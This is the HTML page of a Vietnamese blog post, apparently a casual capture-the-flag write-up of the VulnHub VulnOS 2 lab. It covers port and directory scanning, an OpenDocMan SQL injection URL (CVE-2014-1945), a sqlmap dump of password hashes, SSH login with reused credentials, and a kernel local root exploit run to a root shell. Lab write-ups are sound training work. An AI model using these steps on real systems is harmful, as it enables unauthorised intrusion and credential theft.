@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: VULNOS: 2Difficulty: EasyĐuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] VulnOS 2">
+<meta property="og:url" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: VULNOS: 2Difficulty: EasyĐuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/vulnos2-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/3.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/4.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/7.png">
+<meta property="article:published_time" content="2021-02-01T08:40:23.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.615Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/vulnos2-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/","path":"2021/02/01/vulnos2-vulnhub/","title":"[VulnHub] VulnOS 2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] VulnOS 2 | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dirsearch"><span class="nav-number">2.2.</span> <span class="nav-text">Dirsearch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap"><span class="nav-number">2.3.</span> <span class="nav-text">Sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">3.</span> <span class="nav-text">Privilege Escalation</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/02/01/vulnos2-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] VulnOS 2 | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] VulnOS 2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-02-01 15:40:23" itemprop="dateCreated datePublished" datetime="2021-02-01T15:40:23+07:00">2021-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/vulnos2-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/vulnos-2,147/">VULNOS: 2</a><br>Difficulty: Easy<br>Đuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.</p>
+<span id="more"></span>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sn -v 10.10.10.102-105</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 15:39 +07</span><br><span class="line">Initiating Ping Scan at 15:39</span><br><span class="line">Scanning 4 hosts [2 ports/host]</span><br><span class="line">Completed Ping Scan at 15:39, 1.20s elapsed (4 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 15:39</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 15:39, 0.04s elapsed</span><br><span class="line">Nmap scan report for 10.10.10.102 [host down]</span><br><span class="line">Nmap scan report for 10.10.10.103</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Nmap scan report for 10.10.10.104 [host down]</span><br><span class="line">Nmap scan report for 10.10.10.105 [host down]</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p- 10.10.10.103 --min-rate 3000</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 15:39 +07</span><br><span class="line">Nmap scan report for 10.10.10.103</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">6667/tcp open  irc</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p 22,80,6667 -A 10.10.10.103</span>   </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 15:41 +07</span><br><span class="line">Nmap scan report for 10.10.10.103</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)</span><br><span class="line">|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)</span><br><span class="line">|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)</span><br><span class="line">|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: VulnOSv2</span><br><span class="line">6667/tcp open  irc     ngircd</span><br><span class="line">Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds</span><br></pre></td></tr></table></figure>
+<p>Có cái cổng 6667 chạy dịch vụ đéo gì kia, <em>irc</em>, wtf!? Không vội cắm mặt vào cái này, chả đi đến đâu đâu, tôi thử rồi :&#x2F;<br>Tập trung vào cái http server của nó đã.<br><img src="/2021/02/01/vulnos2-vulnhub/1.png"><br>Nhìn cái mặt tiền web site này u tối như chợ đen (đen đúng nghĩa đen). <em>Enumerate</em> cái URL này để kiếm file ẩn.</p>
+<h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...bla...bla...bla...</span><br><span class="line">[22:05:27] 200 -   10KB - /jabc/includes/</span><br><span class="line">[22:05:27] 200 -  117KB - /jabc/includes/bootstrap.inc</span><br><span class="line">[22:05:27] 200 -    9KB - /jabc/index.php</span><br><span class="line">[22:05:27] 200 -    3KB - /jabc/install.php</span><br><span class="line">[22:05:28] 301 -  315B  - /jabc/misc  -&gt;  http://10.10.10.103/jabc/misc/</span><br><span class="line">[22:05:28] 301 -  318B  - /jabc/modules  -&gt;  http://10.10.10.103/jabc/modules/</span><br><span class="line">[22:05:28] 200 -    9KB - /jabc/modules/</span><br><span class="line">[22:05:31] 301 -  319B  - /jabc/profiles  -&gt;  http://10.10.10.103/jabc/profiles/</span><br><span class="line">[22:05:31] 200 -  743B  - /jabc/profiles/standard/standard.info</span><br><span class="line">[22:05:31] 200 -  278B  - /jabc/profiles/testing/testing.info</span><br><span class="line">[22:05:31] 200 -  271B  - /jabc/profiles/minimal/minimal.info</span><br><span class="line">[22:05:31] 200 -    2KB - /jabc/robots.txt</span><br><span class="line">[22:05:32] 301 -  318B  - /jabc/scripts  -&gt;  http://10.10.10.103/jabc/scripts/</span><br><span class="line">[22:05:32] 200 -  949B  - /jabc/scripts/</span><br><span class="line">[22:05:32] 301 -  316B  - /jabc/sites  -&gt;  http://10.10.10.103/jabc/sites/</span><br><span class="line">[22:05:33] 301 -  320B  - /jabc/templates  -&gt;  http://10.10.10.103/jabc/templates/</span><br><span class="line">[22:05:33] 200 -  976B  - /jabc/templates/</span><br><span class="line">[22:05:34] 301 -  317B  - /jabc/themes  -&gt;  http://10.10.10.103/jabc/themes/</span><br><span class="line">[22:05:34] 200 -    2KB - /jabc/themes/</span><br><span class="line">[22:05:34] 403 -    4KB - /jabc/update.php</span><br><span class="line">[22:05:35] 200 -   42B  - /jabc/xmlrpc.php</span><br></pre></td></tr></table></figure>
+<p>Nền tảng Drupal, phiên bản 7.26, kiếm được ở đâu thì ở đây nhé.<br><em>&#x2F;jabc&#x2F;profiles&#x2F;standard&#x2F;standard.info</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Information added by Drupal.org packaging script on 2014-01-15</span><br><span class="line">version = &quot;7.26&quot;</span><br><span class="line">project = &quot;drupal&quot;</span><br><span class="line">datestamp = &quot;1389815930&quot;</span><br></pre></td></tr></table></figure>
+<p>Cái đìn địz! Cái chỗ file&#x2F;folder này khiến tôi mất thời gian thực sự nhiều, toàn trap hết, đây là kết luận của tôi sau 15 phút mò mẫm hết cái đống này và chả kiếm chác thêm được gì có giá trị. Quay trở lại với mặt tiền đen xì xì kia, có đoạn này.<br><img src="/2021/02/01/vulnos2-vulnhub/2.png"><br>Cái trò nền đen chữ đen này xưa như trái đất rồi nhé tml!<br>Login vào một web site khác với tài khoản và mật khẩu là guest&#x2F;guest.<br><em>Cảm thấy tiếc thời gian vào cái đống file enumerate vcl</em><br><img src="/2021/02/01/vulnos2-vulnhub/3.png"><br>Để ý thấy OpenDocMan v1.2.7. Search lỗi về thằng này ngay và luôn.<br><img src="/2021/02/01/vulnos2-vulnhub/4.png"><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/32075">https://www.exploit-db.com/exploits/32075</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) SQL Injection in OpenDocMan: CVE-2014-1945</span><br><span class="line"></span><br><span class="line">The vulnerability exists due to insufficient validation of &quot;add_value&quot; HTTP GET parameter in &quot;/ajax_udf.php&quot; script. A remote unauthenticated attacker can execute arbitrary SQL commands in application&#x27;s database.</span><br><span class="line"></span><br><span class="line">The exploitation example below displays version of the MySQL server:</span><br><span class="line"></span><br><span class="line">http://[host]/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,v</span><br><span class="line"><span class="meta prompt_">ersion%</span><span class="language-bash">28%29,3,4,5,6,7,8,9</span></span><br></pre></td></tr></table></figure>
+<p>Rõ ràng &#x3D;)) ném thằng vào Sqlmap chứ còn gì nữa.</p>
+<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: jabcd0cs                                                                                                       </span><br><span class="line">Table: odm_user</span><br><span class="line">[3 entries]</span><br><span class="line">+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+</span><br><span class="line">| id | Email              | phone       | password                                 | username | last_name | department | first_name | pw_reset_code |</span><br><span class="line">+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+</span><br><span class="line">| 1  | webmin@example.com | 5555551212  | b78aae356709f8c31118ea613980954b         | webmin   | min       | 2          | web        | &lt;blank&gt;       |</span><br><span class="line">| 2  | guest@example.com  | 555 5555555 | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest    | guest     | 2          | guest      | NULL          |</span><br><span class="line">+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/01/vulnos2-vulnhub/5.png"><br><code>b78aae356709f8c31118ea613980954b:webmin1980</code><br>Đến đây lại mất thêm thời gian để mò mẫm xem admin có làm gì được thêm không, có upload file, enable extention file để upload shell bla bla… đều đéo được :)<br>Một kinh nghiệm được rút ra khi tôi làm bài Writeup-HackTheBox, đó là tài khoản đăng nhập trên Http server hoàn toàn có thể đăng nhập được cả trên SSH, vì sao? Vì con người ấy mà, để tránh phải nhớ nhiều account trên một hệ thống, họ thường có xu hướng để cmn giống hệt nhau.<br>Xét cho cùng, thì con người vẫn luôn là điểm yếu nhất của hệ thống.<br><img src="/2021/02/01/vulnos2-vulnhub/6.png"></p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Vì có được mật khẩu của user webmin, nên tôi không ngại khoản chạy lệnh sudo, chỉ là sudoer đéo cho tôi vào danh sách thôi :v<br>Để ý thấy phiên bản kernel hệ điều hành đang chạy là 3.13, hàng cổ đấy, và tôi biết thừa là nó dính lỗi leo quyền vì tôi từng gặp rồi :)))<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33824">https://www.exploit-db.com/exploits/33824</a><br><img src="/2021/02/01/vulnos2-vulnhub/7.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webmin@VulnOSv2:~/duma$ gcc 37292.c -o i_am_groot</span><br><span class="line">webmin@VulnOSv2:~/duma$ ./i_am_groot </span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(webmin)</span><br></pre></td></tr></table></figure>
+<p>Done!</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/" rel="prev" title="[AttackDefense] Privilege Escalation: CTF [Oct 16-20]">
+                  <i class="fa fa-angle-left"></i> [AttackDefense] Privilege Escalation: CTF [Oct 16-20]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/03/mrrobot-vulnhub/" rel="next" title="[VulnHub] Mr.Robot">
+                  [VulnHub] Mr.Robot <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
